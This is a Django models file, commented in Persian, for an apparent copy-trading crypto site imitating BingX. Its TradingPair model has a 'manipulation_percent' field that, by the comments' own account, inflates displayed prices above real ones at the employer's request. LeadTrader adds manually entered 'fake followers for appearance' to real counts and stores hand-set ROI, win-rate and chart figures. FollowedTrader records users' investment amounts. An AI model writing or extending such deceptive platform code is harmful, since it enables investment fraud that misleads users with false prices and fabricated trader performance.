from django.db import models
from django.conf import settings

class TradingPair(models.Model):
    """مدل ارزها با قابلیت دستکاری قیمت لحظه‌ای (خواسته کارفرما)"""
    symbol = models.CharField(max_length=20, unique=True, help_text="Example: BTC/USDT")
    display_name = models.CharField(max_length=50, help_text="The random name (e.g., Alpha Strategy)")
    real_price = models.DecimalField(max_digits=20, decimal_places=8, default=0.0)
    
    # ضریب دستکاری: مثلا 2.5 یعنی 2.5 درصد قیمت را بالاتر نشان بده
    manipulation_percent = models.FloatField(default=0.0) 
    
    is_active = models.BooleanField(default=True)
    last_updated = models.DateTimeField(auto_now=True)

    @property
    def display_price(self):
        """قیمتی که با احتساب دستکاری در سایت نمایش داده می‌شود"""
        if not self.real_price:
            return 0.0
        adjustment = (float(self.real_price) * self.manipulation_percent) / 100
        return float(self.real_price) + adjustment

    def __str__(self):
        return f"{self.display_name} ({self.symbol})"


class LeadTrader(models.Model):
    """مدل تریدرهای حرفه‌ای (Copy Trading) مطابق ظاهر BingX"""
    name = models.CharField(max_length=100)
    avatar = models.ImageField(upload_to='traders/', blank=True, null=True)
    
    # آمارهای ۳۰ روزه
    roi_30d = models.DecimalField(max_digits=10, decimal_places=2, help_text="ROI Percentage (e.g., 214.50)")
    pnl_30d = models.DecimalField(max_digits=20, decimal_places=2, help_text="Total Profit in USDT")
    aum = models.DecimalField(max_digits=20, decimal_places=2, verbose_name="Assets Under Management")
    max_drawdown = models.DecimalField(max_digits=5, decimal_places=2, default=0.0)
    
    # فیلدهای تکمیلی برای جلب رضایت کارفرما
    win_rate = models.IntegerField(default=85, help_text="Percentage 0-100")
    risk_level = models.IntegerField(default=3, help_text="Scale 1-10")
    followers_count_manual = models.IntegerField(default=0, help_text="Fake followers for appearance")
    capacity = models.IntegerField(default=100)
    
    # دیتای نمودار (بصورت لیست اعداد)
    chart_history_json = models.JSONField(default=list, help_text="Example: [10, 25, 40, 35, 60, 90, 200]")

    @property
    def copiers_count(self):
        """تعداد واقعی فالوورها + عدد دستی برای ظاهر بهتر"""
        actual_followers = self.followedtrader_set.count()
        return actual_followers + self.followers_count_manual

    def __str__(self):
        return f"{self.name} (ROI: {self.roi_30d}%)"


class FollowedTrader(models.Model):
    """رابط بین کاربر و تریدر کپی شده"""
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
    trader = models.ForeignKey(LeadTrader, on_delete=models.CASCADE)
    investment_amount = models.DecimalField(max_digits=20, decimal_places=2)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.user.username} follows {self.trader.name}"